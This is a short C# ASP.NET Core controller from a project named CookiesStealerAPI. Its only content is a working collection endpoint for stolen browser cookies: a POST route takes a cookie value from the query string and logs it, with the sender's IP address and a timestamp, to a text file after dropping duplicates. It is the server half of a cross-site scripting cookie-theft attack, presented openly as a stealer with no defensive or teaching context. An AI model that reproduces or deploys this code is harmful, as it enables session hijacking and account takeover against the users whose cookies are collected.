using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using System.Net;

namespace CookiesStealerAPI.Controllers
{
    [Route("api/[controller]")]
    [ApiController]
    public class  StealCookiesController: ControllerBase
    {
        private static HashSet<string> seenCookies = new HashSet<string>();


        [HttpPost]
        public IActionResult PostStolenCookie([FromQuery(Name = "cookie")] string cookie)
        {

            if (string.IsNullOrEmpty(cookie))
            {
                return Content("");
            }

            string clientIp = HttpContext.Connection.RemoteIpAddress?.ToString();
            string timestamp = DateTime.UtcNow.ToString("yyyy-MM-dd HH:mm:ss");

            string cookieEntry = $"Timestamp: {timestamp}, IP: {clientIp}, Cookie: {cookie}";

            // Check for duplication
            if (!seenCookies.Contains(cookie))
            {
                seenCookies.Add(cookie); // Add to seen to prevent future duplicates
                StoreInFile(cookieEntry);
            }


            return Content("");
        }

        private void StoreInFile(string cookieEntry)
        {
            // Specify the path to your file
            string filePath = "stored_cookies.txt";
            // Using 'true' for appending data to the file
            using (StreamWriter file = new StreamWriter(filePath, true))
            {
                file.WriteLine(cookieEntry);
            }
        }
    }
}
